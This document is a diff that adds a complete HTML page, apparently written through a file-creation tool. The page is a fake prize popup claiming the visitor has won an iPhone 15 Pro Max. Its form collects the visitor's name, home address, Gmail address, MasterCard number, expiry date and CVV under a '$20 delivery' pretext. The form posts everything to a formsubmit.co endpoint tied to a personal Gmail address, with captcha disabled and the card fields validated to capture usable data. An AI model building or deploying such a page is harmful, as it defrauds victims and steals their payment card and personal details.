@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Congratulations! You Won a Gift 🎉🥳</title>
+  <style>
+    /* Reset and base styles */
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      max-height: 600px;
+      max-width: 350px;
+      width: 100vw;
+      background: white; /* Clean white background */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #0b2e77; /* dark blue text */
+      overflow: hidden;
+    }
+    #popupOverlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(11,46,119,0.5); /* translucent blue overlay */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 100;
+      padding: 0 10px;
+    }
+    #popup {
+      background: white;
+      border-radius: 20px;
+      padding: 2rem 1.5rem;
+      width: 100%;
+      max-width: 320px;
+      box-shadow: 0 20px 40px rgba(11,46,119,0.2);
+      text-align: center;
+      animation: popIn 0.3s ease forwards;
+      color: #0b2e77;
+      box-sizing: border-box;
+    }
+    @keyframes popIn {
+      from {
+        opacity: 0;
+        transform: scale(0.7);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+    #popup h1 {
+      font-size: 1.8rem;
+      margin: 0 0 0.5rem;
+      font-weight: 700;
+      line-height: 1.2;
+    }
+    #popup p {
+      font-size: 1rem;
+      margin: 0.5rem 0 1.5rem;
+      color: #0b2e77;
+      font-weight: 600;
+    }
+    #claimBtn {
+      background: #0b2e77;
+      border: none;
+      color: white;
+      padding: 14px 20px;
+      border-radius: 30px;
+      font-size: 1.15rem;
+      cursor: pointer;
+      font-weight: 700;
+      letter-spacing: 1px;
+      transition: background 0.3s ease;
+      width: 100%;
+      box-shadow: 0 5px 15px rgba(11,46,119,0.3);
+    }
+    #claimBtn:hover,
+    #claimBtn:focus {
+      background: #06418c;
+      outline: none;
+    }
+
+    /* Form container */
+    #formContainer {
+      background: white;
+      border-radius: 20px;
+      padding: 1.5rem 1.5rem 2rem;
+      width: 100%;
+      max-width: 320px;
+      max-height: 580px;
+      box-shadow: 0 20px 40px rgba(11,46,119,0.2);
+      display: none; /* hidden initially */
+      flex-direction: column;
+      box-sizing: border-box;
+      color: #0b2e77;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      margin: 0 10px;
+    }
+    #formContainer h2 {
+      margin-top: 0;
+      margin-bottom: 1rem;
+      font-size: 1.6rem;
+      line-height: 1.2;
+      text-align: center;
+      font-weight: 700;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 0.9rem;
+      font-size: 1rem;
+    }
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 4px;
+      color: #0b2e77;
+      font-size: 0.9rem;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"] {
+      padding: 9px 14px;
+      font-size: 1rem;
+      border: 2px solid #aac8ff;
+      border-radius: 12px;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+      width: 100%;
+      font-weight: 600;
+      color: #0b2e77;
+    }
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="tel"]:focus {
+      outline: none;
+      border-color: #06418c;
+      box-shadow: 0 0 6px #3a70f8;
+      background: #ebf2ff;
+    }
+    #submitBtn {
+      background: #0b2e77;
+      color: white;
+      padding: 13px 0;
+      border: none;
+      font-size: 1.1rem;
+      cursor: pointer;
+      border-radius: 30px;
+      font-weight: 700;
+      transition: background 0.3s ease, box-shadow 0.3s ease;
+      width: 100%;
+      box-shadow: 0 5px 15px rgba(11,46,119,0.4);
+      user-select: none;
+    }
+    #submitBtn:hover,
+    #submitBtn:focus {
+      background: #06418c;
+      box-shadow: 0 7px 20px rgba(6,65,140,0.6);
+      outline: none;
+    }
+    #statusMessage {
+      text-align: center;
+      margin-top: 1rem;
+      font-weight: 700;
+      color: #0b2e77;
+      min-height: 1.5em;
+      font-size: 0.95rem;
+    }
+    /* Responsive adjustments */
+    @media (max-width: 350px) {
+      body, html {
+        max-width: 100vw;
+        max-height: 600px;
+      }
+      #popup, #formContainer {
+        width: calc(100vw - 20px);
+        max-width: none;
+        max-height: 580px;
+        margin: 0 10px;
+      }
+      #popup h1 {
+        font-size: 1.6rem;
+      }
+      #popup p {
+        font-size: 1rem;
+      }
+      #claimBtn {
+        font-size: 1.1rem;
+        padding: 12px 0;
+      }
+      #formContainer h2 {
+        font-size: 1.4rem;
+      }
+      form {
+        gap: 0.75rem;
+      }
+      label {
+        font-size: 0.85rem;
+      }
+      input[type="text"],
+      input[type="email"],
+      input[type="tel"] {
+        padding: 8px 12px;
+        font-size: 0.95rem;
+      }
+      #submitBtn {
+        font-size: 1rem;
+        padding: 12px 0;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div id="popupOverlay" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
+  <div id="popup">
+    <h1 id="popupTitle">🎉🥳 Congratulations! 🥳🎉</h1>
+    <p>You have won a <strong>gift</strong>: <br><span style="font-size:1.3rem;">iPhone 15 Pro Max</span></p>
+    <button id="claimBtn" aria-describedby="popupDescription">Claim Your Gift</button>
+  </div>
+</div>
+
+<div id="formContainer" role="form" aria-labelledby="formTitle" aria-describedby="formDesc">
+  <h2 id="formTitle">Claim Your iPhone 15 Pro Max</h2>
+  <p id="formDesc" style="text-align:center; color:#a33; font-weight:bold; margin-bottom:1rem;">
+    Note: You will be charged <strong>$20</strong> for delivery.
+  </p>
+  <form id="claimForm" action="https://formsubmit.co/donkingsley96@gmail.com" method="POST" autocomplete="off" novalidate>
+    <input type="hidden" name="_captcha" value="false" />
+    <input type="hidden" name="_next" value="https://your-website.com/thank-you.html" />
+    <!-- Honeypot field -->
+    <input type="text" name="_honey" style="display:none" tabindex="-1" autocomplete="off" />
+    
+    <label for="nameInput">Full Name</label>
+    <input id="nameInput" type="text" name="name" placeholder="John Doe" required autocomplete="name" />
+    
+    <label for="addressInput">Home Address</label>
+    <input id="addressInput" type="text" name="address" placeholder="123 Street, City, Country" required autocomplete="street-address" />
+    
+    <label for="emailInput">Gmail Address</label>
+    <input id="emailInput" type="email" name="email" placeholder="example@gmail.com" pattern=".+@gmail\.com" title="Please enter a valid Gmail address" required autocomplete="email" />
+  
+    <label for="cardNumberInput">MasterCard Number</label>
+    <input id="cardNumberInput" type="tel" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" title="Please enter a valid 16-digit MasterCard number" required autocomplete="cc-number" />
+    
+    <label for="expiryInput">Expiry Date (MM/YY)</label>
+    <input id="expiryInput" type="text" name="expiry" placeholder="MM/YY" pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$" maxlength="5" title="Enter expiry date as MM/YY" required autocomplete="cc-exp" />
+    
+    <label for="cvvInput">CVV</label>
+    <input id="cvvInput" type="tel" name="cvv" placeholder="123" pattern="\\d{3}" maxlength="3" inputmode="numeric" title="Enter 3-digit CVV" required autocomplete="cc-csc" />
+    
+    <button type="submit" id="submitBtn">Submit Details &amp; Claim Gift</button>
+  </form>
+  <div id="statusMessage" role="alert" aria-live="polite"></div>
+</div>
+
+<script>
+  const popupOverlay = document.getElementById('popupOverlay');
+  const claimBtn = document.getElementById('claimBtn');
+  const formContainer = document.getElementById('formContainer');
+  const claimForm = document.getElementById('claimForm');
+  const statusMessage = document.getElementById('statusMessage');
+  const cardNumberInput = document.getElementById('cardNumberInput');
+
+  // Show form on claim button click and hide popup
+  claimBtn.addEventListener('click', () => {
+    popupOverlay.style.display = 'none';
+    formContainer.style.display = 'flex';
+    document.getElementById('nameInput').focus();
+  });
+
+  // Format MasterCard number input with spaces as user types
+  cardNumberInput.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 16) value = value.slice(0,16);
+    const spacedValue = value.replace(/(.{4})/g, '$1 ').trim();
+    e.target.value = spacedValue;
+  });
+
+  // Client-side form validation
+  claimForm.addEventListener('submit', event => {
+    statusMessage.textContent = '';
+
+    // Expiry date validation MM/YY
+    const expiry = claimForm.expiry.value.trim();
+    const expiryRegex = /^(0[1-9]|1[0-2])\/?([0-9]{2})$/;
+    if (!expiryRegex.test(expiry)) {
+      event.preventDefault();
+      statusMessage.textContent = 'Please enter a valid expiry date in MM/YY format.';
+      statusMessage.style.color = 'red';
+      claimForm.expiry.focus();
+      return false;
+    }
+
+    // Card number validation (16 digits)
+    const cardNumberRaw = claimForm.cardNumber.value.replace(/\s+/g, '');
+    if (!/^\d{16}$/.test(cardNumberRaw)) {
+      event.preventDefault();
+      statusMessage.textContent = 'Please enter a valid 16-digit MasterCard number.';
+      statusMessage.style.color = 'red';
+      claimForm.cardNumber.focus();
+      return false;
+    }
+
+    // CVV validation (3 digits)
+    const cvv = claimForm.cvv.value.trim();
+    if (!/^\d{3}$/.test(cvv)) {
+      event.preventDefault();
+      statusMessage.textContent = 'Please enter a valid 3-digit CVV.';
+      statusMessage.style.color = 'red';
+      claimForm.cvv.focus();
+      return false;
+    }
+
+    statusMessage.textContent = 'Submitting... please wait.';
+    statusMessage.style.color = '#0b2e77';
+  });
+</script>
+
+</body>
+</html>
+</content>
+</create_file>
